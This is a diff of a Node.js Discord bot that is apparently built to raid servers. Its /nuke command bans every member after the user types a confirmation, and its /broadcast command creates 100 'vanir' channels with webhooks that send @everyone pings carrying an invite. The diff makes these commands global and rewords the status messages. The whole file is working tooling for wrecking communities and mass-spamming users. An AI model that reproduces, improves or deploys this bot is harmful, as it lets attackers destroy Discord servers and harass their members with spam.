@@ -11,11 +11,11 @@ const {
 } = require('discord.js');
 require('dotenv').config();
 
-// Start web server for Render
+// Express server for Render
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => res.send('Bot is running'));
-app.listen(PORT, () => console.log(`🌐 Web server live on port ${PORT}`));
+app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));
 
 // Discord client setup
 const client = new Client({
@@ -36,31 +36,33 @@ client.once('ready', async () => {
       .toJSON(),
     new SlashCommandBuilder()
       .setName('broadcast')
-      .setDescription('Create 100 channels with webhooks to ping @everyone')
+      .setDescription('Create 100 channels and ping @everyone with invite')
       .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
       .toJSON()
   ];
 
   const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
   await rest.put(
-    Routes.applicationGuildCommands(client.user.id, process.env.GUILD_ID),
+    Routes.applicationCommands(client.user.id), // GLOBAL commands
     { body: commands }
   );
 
-  console.log('✅ Slash commands registered');
+  console.log('✅ Global slash commands registered (may take up to 1 hour to appear)');
 });
 
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
   const guild = interaction.guild;
 
-  // /nuke command
+  if (!guild) return interaction.reply('❌ This command can only be used in a server.');
+
+  // /nuke
   if (interaction.commandName === 'nuke') {
     if (interaction.user.id !== process.env.OWNER_ID) {
       return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
     }
 
-    await interaction.reply('⚠️ Confirm nuke? Type `CONFIRM` within 15 seconds.');
+    await interaction.reply('⚠️ Type `CONFIRM` within 15 seconds to start banning all members.');
 
     const filter = m => m.author.id === interaction.user.id && m.content === 'CONFIRM';
     try {
@@ -72,7 +74,7 @@ client.on('interactionCreate', async (interaction) => {
 
         try {
           if (!bannedUsers.has(id)) {
-            await member.ban({ reason: 'Cleanup command' });
+            await member.ban({ reason: 'Nuke command used' });
             bannedUsers.add(id);
             console.log(`🔨 Banned ${member.user.tag}`);
           }
@@ -81,19 +83,19 @@ client.on('interactionCreate', async (interaction) => {
         }
       }
 
-      interaction.followUp('✅ Nuke complete.');
+      interaction.followUp('✅ All possible members have been banned.');
     } catch {
-      interaction.followUp('❌ Nuke cancelled or timed out.');
+      interaction.followUp('❌ Timed out or cancelled.');
     }
   }
 
-  // /broadcast command
+  // /broadcast
   if (interaction.commandName === 'broadcast') {
     if (interaction.user.id !== process.env.OWNER_ID) {
       return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
     }
 
-    await interaction.reply('📡 Starting broadcast...');
+    await interaction.reply('📡 Creating 100 channels with webhook pings...');
 
     for (let i = 1; i <= 100; i++) {
       try {
@@ -118,23 +120,24 @@ client.on('interactionCreate', async (interaction) => {
           allowedMentions: { parse: ['everyone'] }
         });
 
-        console.log(`✅ Created channel & webhook: vanir-${i}`);
-        await new Promise(res => setTimeout(res, 500)); // Prevent rate limits
+        console.log(`✅ Sent message in channel vanir-${i}`);
+        await new Promise(res => setTimeout(res, 500)); // delay to avoid rate limits
       } catch (err) {
-        console.error(`❌ Error on vanir-${i}: ${err.message}`);
+        console.error(`❌ Error in vanir-${i}: ${err.message}`);
       }
     }
 
-    interaction.followUp('✅ Broadcast finished.');
+    interaction.followUp('✅ All channels and messages sent.');
   }
 });
 
-client.login(process.env.TOKEN);
-
-process.on('unhandledRejection', (reason, promise) => {
+// Global error handlers
+process.on('unhandledRejection', (reason) => {
   console.error('🧨 Unhandled Rejection:', reason);
 });
 
 process.on('uncaughtException', (err) => {
   console.error('💥 Uncaught Exception:', err);
 });
+
+client.login(process.env.TOKEN);
